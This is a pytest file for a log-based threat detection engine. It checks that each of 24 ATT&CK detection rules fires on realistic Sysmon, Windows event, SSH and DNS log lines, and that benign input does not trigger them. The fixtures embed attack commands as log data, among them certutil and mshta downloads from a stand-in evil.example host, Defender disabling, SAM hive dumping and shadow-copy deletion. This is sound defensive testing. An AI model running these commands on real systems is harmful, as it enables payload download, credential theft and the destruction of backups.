"""Every ATT&CK rule must be reachable from real parsed log text.

Before these tests, 20 of the 24 rules could never fire (no parser produced the source type or
field a rule needed, or the rule used a pattern type the engine ignored) and nothing noticed.
Each case below feeds realistic raw lines through the real ingest agent, then the rule engine.
"""

import asyncio

import pytest

from app.agents.ingest_agent import ingest_agent
from app.detection.attack_rules import ATTACK_DETECTION_RULES, SUPPORTED_PATTERN_TYPES, evaluate_attack_rules


def fired(lines):
    state = asyncio.run(ingest_agent({"raw_logs": lines, "logs": [], "alerts": [], "agent_execution_log": []}))
    return {a["technique_id"] for a in evaluate_attack_rules(state["logs"])}


def ssh_fail(i, ip="203.0.113.9", user="root", minute="30"):
    return f"Jan 15 10:{minute}:{i:02d} host sshd[1]: Failed password for {user} from {ip} port 22"


def sysmon(event_id, kind, **kv):
    fields = " ".join(f'{k}={v}' for k, v in kv.items())
    return f"Sysmon EventID={event_id} {kind}: {fields}"


def dns_tunnel(n=4):
    labels = ["q7f2mZk9pXrT4wLc8sVnJhYd2eBaR", "x1kLp8QzWvNc3rYt6uJmSdA9fGhB2",
              "m4TgR7hNcVpL2xQsZkYw9uBdFj5eA", "z8Nw3KpLr6TyQv1XcMb5HsJd4GfA9"]
    return [f"resolver-01: query name={labels[i]}.datasync-relay.net type=TXT client=10.0.5.22" for i in range(n)]


CASES = {
    "T1566.001": ['email-gateway01: from=a@evil.example to=b@corp.example subject="Invoice" attachment=Invoice.docm attachment_verdict=malicious_macro'],
    "T1110.001": [ssh_fail(i) for i in range(6)],
    "T1110.003": [ssh_fail(i, user=f"user{i}") for i in range(10)],
    "T1059.001": [sysmon(1, "ProcessCreate", Image="C:\\Windows\\System32\\powershell.exe", CommandLine='"powershell -enc SQBFAFgA"')],
    "T1059.003": [sysmon(1, "ProcessCreate", Image="C:\\Windows\\System32\\cmd.exe", ParentImage='"C:\\Program Files\\WINWORD.EXE"')],
    "T1547.001": [sysmon(13, "RegistryEvent", TargetObject="HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\updater")],
    "T1053.005": ["Microsoft-Windows-Security-Auditing Event ID 4698 A scheduled task was created Account Name: bob"],
    "T1136.001": ["Microsoft-Windows-Security-Auditing EventID=4720 A user account was created. Account Name: backdoor"],
    "T1548.002": ['{"timestamp":"2026-01-01T10:00:00","Image":"C:\\\\Windows\\\\System32\\\\fodhelper.exe","commandLine":"fodhelper.exe"}'],
    "T1003.001": [sysmon(10, "ProcessAccess", SourceImage="C:\\Temp\\x.exe", TargetImage="C:\\Windows\\System32\\lsass.exe", GrantedAccess="0x1410")],
    "T1070.001": ["Microsoft-Windows-Security-Auditing Event ID: 1102 The audit log was cleared Account Name: admin"],
    "T1562.001": [sysmon(1, "ProcessCreate", Image="powershell.exe", CommandLine='"Set-MpPreference -DisableRealtimeMonitoring $true"')],
    "T1087.001": [sysmon(1, "ProcessCreate", Image="net.exe", CommandLine=c).replace("Sysmon EventID=1", f"Sysmon EventID=1 UtcTime=2026-01-01T10:0{i}:00") for i, c in enumerate(['"net user"', '"net localgroup administrators"', '"net group domain admins"'])],
    "T1021.001": ["Microsoft-Windows-Security-Auditing EventID=4624 An account was successfully logged on. Logon Type: 10 Account Name: bob Source Network Address: 10.0.0.5"],
    "T1021.002": [sysmon(11, "FileCreate", TargetFilename="\\\\fileserver02\\C$\\Windows\\Temp\\svc.exe")],
    "T1560.001": [sysmon(1, "ProcessCreate", Image="7z.exe", CommandLine='"7z a -pSecret data.7z C:\\Finance"')],
    "T1048.003": dns_tunnel(),
    "T1218.011": [sysmon(1, "ProcessCreate", Image="C:\\Windows\\System32\\rundll32.exe", CommandLine='"rundll32.exe javascript:\\"..\\mshtml,RunHTMLApplication"')],
    "T1218.005": [sysmon(1, "ProcessCreate", Image="C:\\Windows\\System32\\mshta.exe", CommandLine='"mshta.exe http://evil.example/a.hta"')],
    "T1105": [sysmon(1, "ProcessCreate", Image="certutil.exe", CommandLine='"certutil.exe -urlcache -split -f http://evil.example/x.exe x.exe"')],
    "T1543.003": [sysmon(1, "ProcessCreate", Image="sc.exe", CommandLine='"sc create evilsvc binPath= C:\\\\Temp\\\\x.exe"')],
    "T1003.002": [sysmon(1, "ProcessCreate", Image="reg.exe", CommandLine='"reg save HKLM\\SAM C:\\Temp\\sam.save"')],
    "T1047": [sysmon(1, "ProcessCreate", Image="wmic.exe", CommandLine='"wmic /node:10.0.0.5 process call create calc.exe"')],
    "T1490": [sysmon(1, "ProcessCreate", Image="vssadmin.exe", CommandLine='"vssadmin delete shadows /all /quiet"')],
}


def test_every_rule_has_a_positive_case():
    assert set(CASES) == set(ATTACK_DETECTION_RULES), "add a reachability case for every rule"
    assert len(ATTACK_DETECTION_RULES) == 24


def test_no_rule_uses_an_unsupported_pattern_type():
    for tid, rule in ATTACK_DETECTION_RULES.items():
        for pattern in rule["patterns"]:
            assert pattern["type"] in SUPPORTED_PATTERN_TYPES, f"{tid} uses unimplemented pattern {pattern['type']}"


@pytest.mark.parametrize("technique", sorted(CASES))
def test_rule_fires_on_realistic_input(technique):
    assert technique in fired(CASES[technique])


def test_sysmon_values_with_spaces_do_not_need_quotes():
    line = ("Sysmon EventID=1 ProcessCreate: Image=C:\\Windows\\System32\\cmd.exe "
            "ParentImage=C:\\Program Files\\Microsoft Office\\WINWORD.EXE User=CORP\\bob")
    assert "T1059.003" in fired([line])


class TestNoFalseFires:
    def test_two_failed_logins_is_not_brute_force(self):
        assert not fired([ssh_fail(0), ssh_fail(1)]) & {"T1110.001", "T1110.003"}

    def test_slow_failures_outside_window_are_not_brute_force(self):
        lines = [f"Jan 15 1{i}:30:00 host sshd[1]: Failed password for root from 203.0.113.9 port 22" for i in range(6)]
        assert "T1110.001" not in fired(lines)

    def test_network_logon_is_not_rdp(self):
        line = "Microsoft-Windows-Security-Auditing EventID=4624 successfully logged on. Logon Type: 3 Account Name: bob"
        assert "T1021.001" not in fired([line])


def test_json_auth_failures_are_counted_as_brute_force():
    import json
    lines = [json.dumps({"timestamp": f"2026-09-01T08:00:{i:02d}Z", "event": "login", "result": "failure",
                         "user": "svc_web", "src_ip": "198.51.100.77"}) for i in range(0, 16, 2)]
    assert "T1110.001" in fired(lines)


def test_large_transfer_to_an_internal_backup_host_is_not_exfiltration():
    lines = ["Sep 1 01:00:00 backup01 backup: job=fileserver src=10.0.0.21 dst=10.0.0.90 bytes_out=5GB"]
    assert "T1048.003" not in fired(lines)
